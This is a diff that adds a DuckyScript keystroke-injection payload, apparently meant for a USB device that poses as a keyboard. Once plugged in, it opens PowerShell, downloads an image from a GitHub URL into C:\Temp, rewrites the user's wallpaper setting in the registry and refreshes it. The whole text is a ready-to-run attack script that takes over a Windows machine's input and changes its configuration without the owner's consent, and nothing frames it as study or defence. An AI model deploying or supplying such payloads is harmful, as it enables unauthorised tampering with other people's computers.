@@ -1,0 +1,25 @@
+```
+REM Run, changes wallpaper after restart
+GUI
+REM Now we enter PowerShell and change directory to C:\Temp
+STRING powershell
+ENTER
+DELAY 1000
+STRING cd C:\Temp
+ENTER
+DELAY 100
+REM Here we will download the wallpaper
+STRING powershell -command "& { iwr https://raw.githubusercontent.com/brginc/random/master/w.png -OutFile 16387538917.bmp }"
+ENTER
+DELAY 500
+REM Here we modify the wallpaper through registry
+STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Temp\16387538917.bmp /f
+ENTER
+DELAY 500
+REM Here we update system parameters
+STRING RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+ENTER
+DELAY 200
+STRING exit
+ENTER
+```
